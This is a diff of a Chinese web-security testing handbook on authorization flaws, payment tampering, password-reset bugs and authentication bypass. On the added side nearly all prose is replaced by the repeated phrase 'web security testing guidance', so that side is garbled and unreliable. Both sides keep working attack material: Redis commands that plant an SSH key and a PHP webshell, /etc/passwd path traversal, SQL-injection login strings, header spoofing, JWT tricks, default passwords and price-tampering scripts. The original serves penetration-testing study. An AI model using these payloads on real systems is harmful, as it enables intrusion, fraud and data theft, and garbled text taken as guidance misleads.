@@ -1,169 +1,169 @@
-# Web逻辑与认证安全
+# Webweb security testing guidance
 
-> **来源**: 基于WooYun漏洞库88,636个真实漏洞提炼，覆盖逻辑缺陷(8,292个)与未授权访问(14,377个)两大类
-> **用途**: Web应用安全测试中逻辑漏洞与认证绕过的实战参考手册
+> **web security testing guidance**: web security testing guidanceWooYunweb security testing guidance88,636web security testing guidance，web security testing guidance(8,292web security testing guidance)web security testing guidance(14,377web security testing guidance)web security testing guidance
+> **web security testing guidance**: Webweb security testing guidance
 
 ---
 
-## 一、越权漏洞
+## web security testing guidance、web security testing guidance
 
-### 1.1 漏洞本质
+### 1.1 web security testing guidance
 
-越权漏洞的根因是**授权校验缺失或不完整**——服务端未在每次资源操作时验证请求者是否具有对应权限。
+web security testing guidance**web security testing guidance**——web security testing guidance。
 
-| 类型 | 定义 | 根因 | 风险等级 |
+| web security testing guidance | web security testing guidance | web security testing guidance | web security testing guidance |
 |------|------|------|----------|
-| 水平越权 | 同级用户间越界访问 | 未校验资源归属 | 高 |
-| 垂直越权 | 低权限执行高权限操作 | 未校验角色权限 | 严重 |
+| web security testing guidance | web security testing guidance | web security testing guidance | web security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidance | web security testing guidance |
 
-### 1.2 水平越权(IDOR)
+### 1.2 web security testing guidance(IDOR)
 
-**高频场景与利用方式**:
+**web security testing guidance**:
 
 ```
-场景1: ID遍历——自增ID导致可预测
-GET /address/edit/?addid=100001  → 自己的地址
-GET /address/edit/?addid=100002  → 他人的地址(越权)
+web security testing guidance1: IDweb security testing guidance——web security testing guidanceIDweb security testing guidance
+GET /address/edit/ addid=100001  → web security testing guidance
+GET /address/edit/ addid=100002  → web security testing guidance(web security testing guidance)
 
-场景2: 资源替换攻击——修改操作缺少所有权验证
-账号A创建发票ID=1001 → 账号B修改时替换ID=1001 → A的发票被覆盖
+web security testing guidance2: web security testing guidance——web security testing guidance
+web security testing guidanceAweb security testing guidanceID=1001 → web security testing guidanceBweb security testing guidanceID=1001 → Aweb security testing guidance
 
-场景3: API参数遍历——接口仅验证登录不验证权限
-/personal/center/family/{id}/edit → 替换id泄露他人信息
+web security testing guidance3: APIweb security testing guidance——web security testing guidance
+/personal/center/family/{id}/edit → web security testing guidanceidweb security testing guidance
 ```
 
-**测试方法**:
-1. 抓包记录正常请求中的ID参数(uid/orderId/addid等)
-2. 替换为其他用户的ID，观察响应
-3. 自动化遍历(Burp Intruder或脚本)
-4. 关注增删改查四类操作，修改和删除危害最大
+**web security testing guidance**:
+1. web security testing guidanceIDweb security testing guidance(uid/orderId/addidweb security testing guidance)
+2. web security testing guidanceID，web security testing guidance
+3. web security testing guidance(Burp Intruderweb security testing guidance)
+4. web security testing guidance，web security testing guidance
 
 ```python
-# IDOR自动化检测思路
+# IDORweb security testing guidance
 def idor_test(base_url, param_name, id_range, session_cookie):
     for id in range(id_range[0], id_range[1]):
         resp = requests.get(
-            f"{base_url}?{param_name}={id}",
+            f"{base_url} {param_name}={id}",
             cookies={"session": session_cookie}
         )
-        if resp.status_code == 200 and "敏感数据特征" in resp.text:
+        if resp.status_code == 200 and "web security testing guidance" in resp.text:
             print(f"[!] IDOR: {param_name}={id}")
 ```
 
-**越权测试矩阵**:
+**web security testing guidance**:
 
-| 操作类型 | 测试方法 | 风险等级 |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |----------|----------|----------|
-| 查看 | 替换资源ID | 中 |
-| 修改 | 替换资源ID+数据 | 高 |
-| 删除 | 替换资源ID | 严重 |
-| 创建 | 替换归属用户ID | 高 |
+| web security testing guidance | web security testing guidanceID | web security testing guidance |
+| web security testing guidance | web security testing guidanceID+web security testing guidance | web security testing guidance |
+| web security testing guidance | web security testing guidanceID | web security testing guidance |
+| web security testing guidance | web security testing guidanceID | web security testing guidance |
 
-### 1.3 垂直越权
+### 1.3 web security testing guidance
 
-**核心利用方式**:
+**web security testing guidance**:
 
 ```http
-# 普通用户修改资料时篡改角色标识
+# web security testing guidance
 POST /updateUser HTTP/1.1
-user.aid=3&user.name=test   # aid=3 普通用户
+user.aid=3&user.name=test   # aid=3 web security testing guidance
 
-# 篡改为管理员
+# web security testing guidance
 POST /updateUser HTTP/1.1
-user.aid=1&user.name=test   # aid=1 超级管理员
+user.aid=1&user.name=test   # aid=1 web security testing guidance
 ```
 
-**检测要点**:
-- 枚举角色ID: 通常 1=超管, 2=管理员, 3+=普通用户
-- 测试角色切换: 修改请求中角色标识(role/aid/type/level)
-- 低权限账号直接访问管理员接口URL
-- 篡改权限标识: `isAdmin=0->1`, `role=user->admin`
+**web security testing guidance**:
+- web security testing guidanceID: web security testing guidance 1=web security testing guidance, 2=web security testing guidance, 3+=web security testing guidance
+- web security testing guidance: web security testing guidance(role/aid/type/level)
+- web security testing guidanceURL
+- web security testing guidance: `isAdmin=0->1`, `role=user->admin`
 
-### 1.4 防御措施
+### 1.4 web security testing guidance
 
-- 资源访问前强制校验所有权: `WHERE id=? AND user_id=当前用户`
-- 使用UUID替代自增ID，防止枚举
-- 敏感操作记录审计日志
-- 实施最小权限原则，后端逐接口鉴权
-- 权限校验逻辑集中管理(中间件/拦截器)
+- web security testing guidance: `WHERE id=  AND user_id=web security testing guidance`
+- web security testing guidanceUUIDweb security testing guidanceID，web security testing guidance
+- web security testing guidance
+- web security testing guidance，web security testing guidance
+- web security testing guidance(web security testing guidance/web security testing guidance)
 
 ---
 
-## 二、支付逻辑漏洞
+## web security testing guidance、web security testing guidance
 
-### 2.1 漏洞本质
+### 2.1 web security testing guidance
 
-支付漏洞的核心是**信任边界错误**——将价格计算等敏感逻辑下沉到客户端，服务端未独立校验。
+web security testing guidance**web security testing guidance**——web security testing guidance，web security testing guidance。
 
 ```
-安全模型: 不可信区域(客户端) -> 信任边界 -> 可信区域(服务端)
-错误实现: 直接接受客户端提交的价格作为事实依据
-正确实现: 客户端仅提供商品ID，服务端独立查价计算
+web security testing guidance: web security testing guidance(web security testing guidance) -> web security testing guidance -> web security testing guidance(web security testing guidance)
+web security testing guidance: web security testing guidance
+web security testing guidance: web security testing guidanceID，web security testing guidance
 ```
 
-### 2.2 常见场景与利用技巧
+### 2.2 web security testing guidance
 
-**场景1: 金额直接篡改**
+**web security testing guidance1: web security testing guidance**
 
 ```http
-# 原始请求
+# web security testing guidance
 POST /order/create HTTP/1.1
 {"productId":"12345","quantity":1,"price":299.00}
 
-# 篡改请求
+# web security testing guidance
 POST /order/create HTTP/1.1
 {"productId":"12345","quantity":1,"price":0.01}
 ```
 
-**场景2: 优惠券/折扣逻辑滥用**
+**web security testing guidance2: web security testing guidance/web security testing guidance**
 
 ```
-1. 购买商品A(59元)，触发"满59换购B(5.9元)"
-2. 下单A+B，支付64.9元
-3. 取消商品A，仅保留B
-4. 实际以5.9元购得原价21元的商品B
+1. web security testing guidanceA(59web security testing guidance)，web security testing guidance"web security testing guidance59web security testing guidanceB(5.9web security testing guidance)"
+2. web security testing guidanceA+B，web security testing guidance64.9web security testing guidance
+3. web security testing guidanceA，web security testing guidanceB
+4. web security testing guidance5.9web security testing guidance21web security testing guidanceB
 
-测试思路: 组合订单后部分取消、优惠券使用后退货、积分兑换后退款
+web security testing guidance: web security testing guidance、web security testing guidance、web security testing guidance
 ```
 
-**场景3: 虚拟货币刷取**
-- 注册推广可获积分 -> 暴力破解验证码批量注册 -> 积分兑换实物
+**web security testing guidance3: web security testing guidance**
+- web security testing guidance -> web security testing guidance -> web security testing guidance
 
-**场景4: 数量/负数攻击**
-- `count=1 -> count=-1` (负数导致退款)
-- `price=100 -> price=-100` (负金额)
+**web security testing guidance4: web security testing guidance/web security testing guidance**
+- `count=1 -> count=-1` (web security testing guidance)
+- `price=100 -> price=-100` (web security testing guidance)
 
-### 2.3 系统化测试方法
+### 2.3 web security testing guidance
 
 ```
-Phase 1: 参数指纹识别
-  - 抓包订单创建接口
-  - 识别价格参数(price/amount/total/cost/discount)
-  - 确定参数类型(整型/浮点/字符串)
+Phase 1: web security testing guidance
+  - web security testing guidance
+  - web security testing guidance(price/amount/total/cost/discount)
+  - web security testing guidance(web security testing guidance/web security testing guidance/web security testing guidance)
 
-Phase 2: 边界值测试
-  - 最小值: 0, 0.01
-  - 负数: -1, -100, -0.01
-  - 格式: 科学计数法(1e-10), JSON嵌套
-  - 精度: 浮点溢出, 舍入误差
+Phase 2: web security testing guidance
+  - web security testing guidance: 0, 0.01
+  - web security testing guidance: -1, -100, -0.01
+  - web security testing guidance: web security testing guidance(1e-10), JSONweb security testing guidance
+  - web security testing guidance: web security testing guidance, web security testing guidance
 
-Phase 3: 逻辑绕过
-  - 参数冗余: 提交多个price参数
-  - 参数覆盖: 先提价后降价
-  - 优惠券叠加: 价格+折扣双重操纵
-  - 组合订单后部分取消/退货
+Phase 3: web security testing guidance
+  - web security testing guidance: web security testing guidancepriceweb security testing guidance
+  - web security testing guidance: web security testing guidance
+  - web security testing guidance: web security testing guidance+web security testing guidance
+  - web security testing guidance/web security testing guidance
 
-Phase 4: 支付流程各环节校验
-  - 订单生成 -> 检查订单金额
-  - 支付跳转 -> 验证支付金额
-  - 支付回调 -> 伪造回调签名
-  - 退款流程 -> 检查退款金额
+Phase 4: web security testing guidance
+  - web security testing guidance -> web security testing guidance
+  - web security testing guidance -> web security testing guidance
+  - web security testing guidance -> web security testing guidance
+  - web security testing guidance -> web security testing guidance
 ```
 
-**高级利用技巧**:
+**web security testing guidance**:
 
 ```python
-# 价格篡改+并发竞争
+# web security testing guidance+web security testing guidance
 import threading
 def create_order():
     requests.post("/order/create", json={"price":0.01,"productId":"premium"})
@@ -172,224 +172,224 @@ for t in threads: t.start()
 ```
 
 ```http
-# 参数污染: 某些框架会处理重复参数
-POST /order/create?price=299.00&price=0.01
+# web security testing guidance: web security testing guidance
+POST /order/create price=299.00&price=0.01
 
-# 类型转换绕过
-{"price":"0.01"}     字符串
-{"price":1e-10}      科学计数法
-{"price":null}       NULL注入
+# web security testing guidance
+{"price":"0.01"}     web security testing guidance
+{"price":1e-10}      web security testing guidance
+{"price":null}       NULLweb security testing guidance
 ```
 
-### 2.4 防御措施
+### 2.4 web security testing guidance
 
 ```
-Layer 1 输入验证: 仅接受商品ID不接受price; 金额正数最多2位小数
-Layer 2 业务逻辑: 服务端独立计算价格; 价格偏离阈值时拒绝/人工审核
-Layer 3 数据完整性: 订单签名(HMAC)防篡改; 时间戳防重放; 幂等性防重复
-Layer 4 支付验证: 回调金额=订单金额; 严格状态机; 全链路审计日志
+Layer 1 web security testing guidance: web security testing guidanceIDweb security testing guidanceprice; web security testing guidance2web security testing guidance
+Layer 2 web security testing guidance: web security testing guidance; web security testing guidance/web security testing guidance
+Layer 3 web security testing guidance: web security testing guidance(HMAC)web security testing guidance; web security testing guidance; web security testing guidance
+Layer 4 web security testing guidance: web security testing guidance=web security testing guidance; web security testing guidance; web security testing guidance
 ```
 
 ---
 
-## 三、密码重置漏洞
+## web security testing guidance、web security testing guidance
 
-### 3.1 漏洞本质
+### 3.1 web security testing guidance
 
-密码重置漏洞的本质是**身份验证链条断裂**——重置流程中某个环节未正确绑定用户身份。
+web security testing guidance**web security testing guidance**——web security testing guidance。
 
-### 3.2 四大漏洞模式
+### 3.2 web security testing guidance
 
-**模式A: 验证码回显泄露**
+**web security testing guidanceA: web security testing guidance**
 
 ```http
 POST /sendSmsCode HTTP/1.1
 phone=13888888888
 
-# 响应中直接包含验证码
+# web security testing guidance
 {"code":0,"data":{"verifyCode":"123456"}}
 ```
 
-检测方法: 拦截发送验证码的响应包，搜索4-6位数字。
+web security testing guidance: web security testing guidance，web security testing guidance4-6web security testing guidance。
 
-**模式B: 验证码与用户解绑**
-
-```
-1. 用自己手机号收到验证码A
-2. 对目标账号发起找回密码
-3. 使用验证码A完成验证(未绑定用户身份)
-根因: 验证码仅校验有效性，未校验归属用户
-```
-
-**模式C: 重置步骤可跳过**
+**web security testing guidanceB: web security testing guidance**
 
 ```
-正常: 输入账号 -> 身份验证 -> 重置密码 -> 完成
-攻击: 输入账号 -> [跳过] -> 直接访问重置密码页面
-
-实现方式:
-1. 分析前端JS，找到各步骤URL
-2. 直接访问第3步URL
-3. F12修改DOM: 隐藏验证步骤，显示重置步骤
+1. web security testing guidanceA
+2. web security testing guidance
+3. web security testing guidanceAweb security testing guidance(web security testing guidance)
+web security testing guidance: web security testing guidance，web security testing guidance
 ```
 
-**模式D: 凭证参数可控**
+**web security testing guidanceC: web security testing guidance**
+
+```
+web security testing guidance: web security testing guidance -> web security testing guidance -> web security testing guidance -> web security testing guidance
+web security testing guidance: web security testing guidance -> [web security testing guidance] -> web security testing guidance
+
+web security testing guidance:
+1. web security testing guidanceJS，web security testing guidanceURL
+2. web security testing guidance3web security testing guidanceURL
+3. F12web security testing guidanceDOM: web security testing guidance，web security testing guidance
+```
+
+**web security testing guidanceD: web security testing guidance**
 
 ```http
 POST /resetPassword HTTP/1.1
 username=victim&newPassword=hacked123
-# 漏洞: username来自客户端，可被篡改为任意用户
+# web security testing guidance: usernameweb security testing guidance，web security testing guidance
 ```
 
-### 3.3 测试流程
+### 3.3 web security testing guidance
 
 ```
-发起密码重置
-  +-- 抓包分析响应 -> 是否包含验证码 -> 模式A
-  +-- 分析验证流程
-  |     +-- 多步骤 -> 尝试跳过中间步骤 -> 模式C
-  |     +-- 单步骤 -> 检查参数绑定
-  |           +-- 用户ID可控 -> 参数篡改 -> 模式D
-  |           +-- 绑定Session -> Session固定测试
-  +-- 验证码机制
-        +-- 验证码是否与用户绑定 -> 模式B
-        +-- 验证码是否可爆破(无频率限制)
-        +-- 验证码是否有时效性
+web security testing guidance
+  +-- web security testing guidance -> web security testing guidance -> web security testing guidanceA
+  +-- web security testing guidance
+  |     +-- web security testing guidance -> web security testing guidance -> web security testing guidanceC
+  |     +-- web security testing guidance -> web security testing guidance
+  |           +-- web security testing guidanceIDweb security testing guidance -> web security testing guidance -> web security testing guidanceD
+  |           +-- web security testing guidanceSession -> Sessionweb security testing guidance
+  +-- web security testing guidance
+        +-- web security testing guidance -> web security testing guidanceB
+        +-- web security testing guidance(web security testing guidance)
+        +-- web security testing guidance
 ```
 
-### 3.4 防御措施
+### 3.4 web security testing guidance
 
-- 验证码绑定用户Session，校验归属
-- 验证码单次有效+60秒过期
-- 重置Token一次性使用，不可预测
-- 全流程服务端状态校验，禁止跳步
-- 失败5次锁定，防爆破
+- web security testing guidanceSession，web security testing guidance
+- web security testing guidance+60web security testing guidance
+- web security testing guidanceTokenweb security testing guidance，web security testing guidance
+- web security testing guidance，web security testing guidance
+- web security testing guidance5web security testing guidance，web security testing guidance
 
 ---
 
-## 四、业务逻辑缺陷
+## web security testing guidance、web security testing guidance
 
-### 4.1 漏洞本质
+### 4.1 web security testing guidance
 
-业务逻辑缺陷的根因矩阵:
+web security testing guidance:
 
-| 层级 | 缺陷类型 | 典型表现 |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |------|----------|----------|
-| 业务层 | 流程设计缺陷 | 步骤可跳过、状态可伪造 |
-| 接口层 | 参数信任过度 | 客户端校验、服务端未验证 |
-| 认证层 | 凭证管理缺陷 | Token泄露、Session固定 |
-| 授权层 | 权限边界模糊 | 水平/垂直越权 |
+| web security testing guidance | web security testing guidance | web security testing guidance、web security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidance、web security testing guidance |
+| web security testing guidance | web security testing guidance | Tokenweb security testing guidance、Sessionweb security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidance/web security testing guidance |
 
-### 4.2 验证码绕过
+### 4.2 web security testing guidance
 
-**绕过方式1: 验证码不刷新**
-- 登录失败后验证码不自动刷新，同一验证码可重复使用
-- 利用: 手工识别一次，固定验证码暴力破解密码
+**web security testing guidance1: web security testing guidance**
+- web security testing guidance，web security testing guidance
+- web security testing guidance: web security testing guidance，web security testing guidance
 
-**绕过方式2: 验证码可爆破**
-- 4-6位纯数字，无次数/频率限制
-- 爆破空间10000-1000000，30线程约30秒完成
+**web security testing guidance2: web security testing guidance**
+- 4-6web security testing guidance，web security testing guidance/web security testing guidance
+- web security testing guidance10000-1000000，30web security testing guidance30web security testing guidance
 
-**绕过方式3: 前端校验**
-- 验证码仅在前端JS校验，删除前端校验代码或直接调用接口即可绕过
+**web security testing guidance3: web security testing guidance**
+- web security testing guidanceJSweb security testing guidance，web security testing guidance
 
-**验证码安全检测清单**:
-- 验证码是否在响应中泄露
-- 是否与Session/用户绑定
-- 是否有时效性(建议60秒)
-- 验证失败是否强制刷新
-- 是否有频率限制(建议5次/分钟)
-- 复杂度是否足够(建议6位字母数字混合)
+**web security testing guidance**:
+- web security testing guidance
+- web security testing guidanceSession/web security testing guidance
+- web security testing guidance(web security testing guidance60web security testing guidance)
+- web security testing guidance
+- web security testing guidance(web security testing guidance5web security testing guidance/web security testing guidance)
+- web security testing guidance(web security testing guidance6web security testing guidance)
 
-### 4.3 条件竞争(Race Condition)
+### 4.3 web security testing guidance(Race Condition)
 
-适用场景: 优惠券使用、积分兑换、库存扣减、余额支付
+web security testing guidance: web security testing guidance、web security testing guidance、web security testing guidance、web security testing guidance
 
 ```python
 import threading, requests
 def redeem():
     requests.post("/redeem", data={"points":1000, "item":"iPhone"})
 
-# 并发100次，尝试多次兑换同一份积分
+# web security testing guidance100web security testing guidance，web security testing guidance
 threads = [threading.Thread(target=redeem) for _ in range(100)]
 for t in threads: t.start()
 ```
 
-根因: 检查余额与扣减余额不是原子操作，并发下可多次通过检查。
+web security testing guidance: web security testing guidance，web security testing guidance。
 
-### 4.4 参数篡改系统化方法
+### 4.4 web security testing guidance
 
-| 参数类型 | 篡改方向 | 示例 |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |----------|----------|------|
-| 用户ID | 替换为其他用户 | uid=1001->1002 |
-| 金额 | 减小/归零/负数 | price=100->0.01 |
-| 数量 | 负数 | count=1->-1 |
-| 状态 | 翻转布尔值 | isPaid=false->true |
-| 角色 | 提升权限 | role=user->admin |
-| 时间 | 延长有效期 | expireTime->2099-12-31 |
+| web security testing guidanceID | web security testing guidance | uid=1001->1002 |
+| web security testing guidance | web security testing guidance/web security testing guidance/web security testing guidance | price=100->0.01 |
+| web security testing guidance | web security testing guidance | count=1->-1 |
+| web security testing guidance | web security testing guidance | isPaid=false->true |
+| web security testing guidance | web security testing guidance | role=user->admin |
+| web security testing guidance | web security testing guidance | expireTime->2099-12-31 |
 
-### 4.5 业务流程逆向分析法
+### 4.5 web security testing guidance
 
 ```
-步骤1: 绘制完整业务流程图
-步骤2: 识别每个环节的校验点
-步骤3: 评估校验是否可绕过(前端/后端? 可重放? 参数可控?)
-步骤4: 设计绕过测试用例
+web security testing guidance1: web security testing guidance
+web security testing guidance2: web security testing guidance
+web security testing guidance3: web security testing guidance(web security testing guidance/web security testing guidance  web security testing guidance  web security testing guidance )
+web security testing guidance4: web security testing guidance
 
-示例(密码重置流程):
-[输入账号] -> [发送验证码] -> [验证身份] -> [设置新密码]
+web security testing guidance(web security testing guidance):
+[web security testing guidance] -> [web security testing guidance] -> [web security testing guidance] -> [web security testing guidance]
      |              |              |              |
-  账号枚举      验证码泄露      步骤跳过      参数篡改
+  web security testing guidance      web security testing guidance      web security testing guidance      web security testing guidance
 ```
 
-### 4.6 防御原则
+### 4.6 web security testing guidance
 
-- **服务端权威**: 所有校验在服务端完成，前端校验仅为UX
-- **原子操作**: 关键业务(扣款/库存)使用事务+锁
-- **状态机**: 业务流程严格按状态机推进，不可跳步
-- **防重放**: 关键接口幂等设计，请求带时间戳+签名
+- **web security testing guidance**: web security testing guidance，web security testing guidanceUX
+- **web security testing guidance**: web security testing guidance(web security testing guidance/web security testing guidance)web security testing guidance+web security testing guidance
+- **web security testing guidance**: web security testing guidance，web security testing guidance
+- **web security testing guidance**: web security testing guidance，web security testing guidance+web security testing guidance
 
 ---
 
-## 五、认证绕过
+## web security testing guidance、web security testing guidance
 
-### 5.1 漏洞本质
+### 5.1 web security testing guidance
 
-认证绕过的核心是**信任链条被打破**: 系统错误地信任了来自不可信源的身份声明。
+web security testing guidance**web security testing guidance**: web security testing guidance。
 
-### 5.2 Cookie/Session伪造
+### 5.2 Cookie/Sessionweb security testing guidance
 
 ```
-# 直接写入Cookie获得身份
-GET /registeruser/CookInsert?userAccount=admin&inner=1
--> 向Cookie写入admin身份，直接获得管理员Session
+# web security testing guidanceCookieweb security testing guidance
+GET /registeruser/CookInsert userAccount=admin&inner=1
+-> web security testing guidanceCookieweb security testing guidanceadminweb security testing guidance，web security testing guidanceSession
 
-# Cookie中的身份标识可预测
+# Cookieweb security testing guidance
 Cookie: admin=true; userId=1
--> 修改Cookie值即可切换身份
+-> web security testing guidanceCookieweb security testing guidance
 ```
 
-JWT绕过:
+JWTweb security testing guidance:
 
-| 技术 | Payload |
+| web security testing guidance | Payload |
 |------|---------|
-| 空算法 | alg: none |
-| 弱密钥 | 暴力破解HS256密钥 |
-| 算法混淆 | RS256转HS256，用公钥签名 |
+| web security testing guidance | alg: none |
+| web security testing guidance | web security testing guidanceHS256web security testing guidance |
+| web security testing guidance | RS256web security testing guidanceHS256，web security testing guidance |
 
-### 5.3 响应篡改绕过
+### 5.3 web security testing guidance
 
 ```
-正常: 请求验证 -> {"status":"0","msg":"验证码错误"} -> 停留验证页
-攻击: 请求验证 -> 拦截响应 -> 修改为{"status":"1","msg":"成功"} -> 进入下一步
+web security testing guidance: web security testing guidance -> {"status":"0","msg":"web security testing guidance"} -> web security testing guidance
+web security testing guidance: web security testing guidance -> web security testing guidance -> web security testing guidance{"status":"1","msg":"web security testing guidance"} -> web security testing guidance
 ```
 
-适用条件: 客户端根据响应状态控制流程+服务端后续步骤不重新验证。
+web security testing guidance: web security testing guidance+web security testing guidance。
 
-### 5.4 IP伪造/Header绕过
+### 5.4 IPweb security testing guidance/Headerweb security testing guidance
 
 ```http
-# 绕过IP白名单的常用Header
+# web security testing guidanceIPweb security testing guidanceHeader
 X-Forwarded-For: 127.0.0.1
 X-Real-IP: 127.0.0.1
 X-Originating-IP: 127.0.0.1
@@ -398,185 +398,185 @@ X-Client-IP: 127.0.0.1
 Host: localhost
 ```
 
-### 5.5 路径绕过
+### 5.5 web security testing guidance
 
 ```
-# 大小写混淆
+# web security testing guidance
 /ADMIN/  /Admin/  /aDmIn/
 
-# URL编码绕过
+# URLweb security testing guidance
 %2e%2e%2f = ../
-%252e%252e%252f = ../ (双重编码)
+%252e%252e%252f = ../ (web security testing guidance)
 
-# 空字节截断
+# web security testing guidance
 ../../../etc/passwd%00.jpg
 
-# 添加后缀绕过
+# web security testing guidance
 /admin -> /admin/  /admin;.js  /admin%23
 ```
 
-### 5.6 后台未授权访问
+### 5.6 web security testing guidance
 
-高频未授权路径:
+web security testing guidance:
 
 ```
-# Web中间件
+# Webweb security testing guidance
 /console/              (WebLogic)
 /manager/html          (Tomcat)
 /jmx-console/          (JBoss)
 /actuator/env          (Spring Boot)
-/actuator/heapdump     (Spring Boot, 可泄露密码)
+/actuator/heapdump     (Spring Boot, web security testing guidance)
 
-# API接口
-/swagger-ui.html       (API文档)
-/api-docs              (API文档)
-/api/configs           (配置泄露)
+# APIweb security testing guidance
+/swagger-ui.html       (APIweb security testing guidance)
+/api-docs              (APIweb security testing guidance)
+/api/configs           (web security testing guidance)
 
-# 调试/管理
+# web security testing guidance/web security testing guidance
 /admin/index.jsp
 /phpMyAdmin/
-/druid/index.html      (Druid监控)
+/druid/index.html      (Druidweb security testing guidance)
 ```
 
-中间件弱口令速查:
+web security testing guidance:
 
-| 中间件 | 常见弱口令 |
+| web security testing guidance | web security testing guidance |
 |--------|-----------|
 | Tomcat | admin:admin, tomcat:tomcat |
 | WebLogic | weblogic:weblogic, weblogic:12345678 |
-| JBoss | admin:admin(或无认证) |
+| JBoss | admin:admin(web security testing guidance) |
 
-### 5.7 数据库/服务未授权
+### 5.7 web security testing guidance/web security testing guidance
 
-| 服务 | 端口 | 验证命令 | 利用方式 |
+| web security testing guidance | web security testing guidance | web security testing guidance | web security testing guidance |
 |------|------|----------|----------|
-| Redis | 6379 | redis-cli -h IP info | 写SSH公钥/Webshell/计划任务 |
-| MongoDB | 27017 | mongo IP:27017 | 无认证直连，导出全部数据 |
-| Elasticsearch | 9200 | curl IP:9200/_cat/indices | 读取索引数据 |
-| Memcached | 11211 | echo stats, nc IP 11211 | 数据泄露 |
-| Docker API | 2375 | curl IP:2375/info | 容器逃逸/RCE |
+| Redis | 6379 | redis-cli -h IP info | web security testing guidanceSSHweb security testing guidance/Webshell/web security testing guidance |
+| MongoDB | 27017 | mongo IP:27017 | web security testing guidance，web security testing guidance |
+| Elasticsearch | 9200 | curl IP:9200/_cat/indices | web security testing guidance |
+| Memcached | 11211 | echo stats, nc IP 11211 | web security testing guidance |
+| Docker API | 2375 | curl IP:2375/info | web security testing guidance/RCE |
 
-Redis未授权利用链(高危):
+Redisweb security testing guidance(web security testing guidance):
 
 ```bash
 redis-cli -h target
-# 写SSH公钥
+# web security testing guidanceSSHweb security testing guidance
 config set dir /root/.ssh/
 config set dbfilename authorized_keys
 set x "\n\nssh-rsa AAAA...\n\n"
 save
 
-# 写Webshell
+# web security testing guidanceWebshell
 config set dir /var/www/html/
 config set dbfilename shell.php
-set x "<?php system($_GET['c']);?>"
+set x "< php system($_GET['c']); >"
 save
 ```
 
-### 5.8 Session绕过
+### 5.8 Sessionweb security testing guidance
 
 ```
-# Session ID泄露(日志/URL)
-/logs/ctp.log -> 包含Session ID -> 直接使用
+# Session IDweb security testing guidance(web security testing guidance/URL)
+/logs/ctp.log -> web security testing guidanceSession ID -> web security testing guidance
 
-# Session固定攻击
-强制用户使用攻击者指定的Session ID
+# Sessionweb security testing guidance
+web security testing guidanceSession ID
 
-# Session预测
-时间戳/顺序号生成的弱Session -> 可预测下一个Session
+# Sessionweb security testing guidance
+web security testing guidance/web security testing guidanceSession -> web security testing guidanceSession
 ```
 
-### 5.9 万能密码(SQL注入登录)
+### 5.9 web security testing guidance(SQLweb security testing guidance)
 
 ```
-用户名: ' or 1=1--
-密码:   任意
+web security testing guidance: ' or 1=1--
+web security testing guidance:   web security testing guidance
 
-用户名: admin'--
-密码:   任意
+web security testing guidance: admin'--
+web security testing guidance:   web security testing guidance
 ```
 
-### 5.10 认证绕过测试清单
+### 5.10 web security testing guidance
 
-| 测试项 | 方法 | 工具 |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |--------|------|------|
-| Cookie伪造 | 修改用户标识字段 | BurpSuite |
-| Session固定 | 复用他人Session | 抓包工具 |
-| 响应篡改 | 修改返回状态码 | BurpSuite |
-| IP伪造 | 添加X-Forwarded-For | curl/Burp |
-| 前端绕过 | 修改JS逻辑 | DevTools |
-| JWT篡改 | 空算法/弱密钥 | jwt.io/hashcat |
-| 路径绕过 | 大小写/编码/截断 | 手动+字典 |
-| 弱口令 | 默认凭证尝试 | Hydra |
-| SQL注入登录 | 万能密码 | 手动 |
+| Cookieweb security testing guidance | web security testing guidance | BurpSuite |
+| Sessionweb security testing guidance | web security testing guidanceSession | web security testing guidance |
+| web security testing guidance | web security testing guidance | BurpSuite |
+| IPweb security testing guidance | web security testing guidanceX-Forwarded-For | curl/Burp |
+| web security testing guidance | web security testing guidanceJSweb security testing guidance | DevTools |
+| JWTweb security testing guidance | web security testing guidance/web security testing guidance | jwt.io/hashcat |
+| web security testing guidance | web security testing guidance/web security testing guidance/web security testing guidance | web security testing guidance+web security testing guidance |
+| web security testing guidance | web security testing guidance | Hydra |
+| SQLweb security testing guidance | web security testing guidance | web security testing guidance |
 
-### 5.11 防御措施
+### 5.11 web security testing guidance
 
-| 层面 | 措施 |
+| web security testing guidance | web security testing guidance |
 |------|------|
-| 网络 | 内网服务不暴露公网，VPN/堡垒机访问 |
-| 认证 | 强制复杂密码，禁用默认账户，启用MFA |
-| 授权 | 后端每接口校验权限，最小权限原则 |
-| Session | 登录后重新生成SessionID，HttpOnly+Secure |
-| 监控 | 异常登录告警，失败次数锁定，日志审计 |
-| 加固 | 关闭调试接口，删除默认管理页面 |
+| web security testing guidance | web security testing guidance，VPN/web security testing guidance |
+| web security testing guidance | web security testing guidance，web security testing guidance，web security testing guidanceMFA |
+| web security testing guidance | web security testing guidance，web security testing guidance |
+| Session | web security testing guidanceSessionID，HttpOnly+Secure |
+| web security testing guidance | web security testing guidance，web security testing guidance，web security testing guidance |
+| web security testing guidance | web security testing guidance，web security testing guidance |
 
 ---
 
-## 六、系统化测试框架
+## web security testing guidance、web security testing guidance
 
-### 6.1 四阶段测试法
+### 6.1 web security testing guidance
 
 ```
-Phase 1: 情报收集
-  - 枚举所有功能点与接口
-  - 绘制业务流程图
-  - 识别敏感操作(支付/重置/权限变更)
-  - 确定参数的可控性
+Phase 1: web security testing guidance
+  - web security testing guidance
+  - web security testing guidance
+  - web security testing guidance(web security testing guidance/web security testing guidance/web security testing guidance)
+  - web security testing guidance
 
-Phase 2: 威胁建模
-  - 分析每个接口的输入参数与信任边界
-  - 标记服务端 vs 前端校验
-  - 构建攻击树(按越权/支付/认证分类)
-  - 优先级排序(高影响 x 高可能性)
+Phase 2: web security testing guidance
+  - web security testing guidance
+  - web security testing guidance vs web security testing guidance
+  - web security testing guidance(web security testing guidance/web security testing guidance/web security testing guidance)
+  - web security testing guidance(web security testing guidance x web security testing guidance)
 
-Phase 3: 漏洞验证
-  - 按优先级逐项测试
-  - 记录PoC(请求/响应截图)
-  - 评估影响范围(数据量/用户数/金额)
+Phase 3: web security testing guidance
+  - web security testing guidance
+  - web security testing guidancePoC(web security testing guidance/web security testing guidance)
+  - web security testing guidance(web security testing guidance/web security testing guidance/web security testing guidance)
 
-Phase 4: 报告输出
-  - 漏洞描述+复现步骤
-  - 根因分析+影响评估
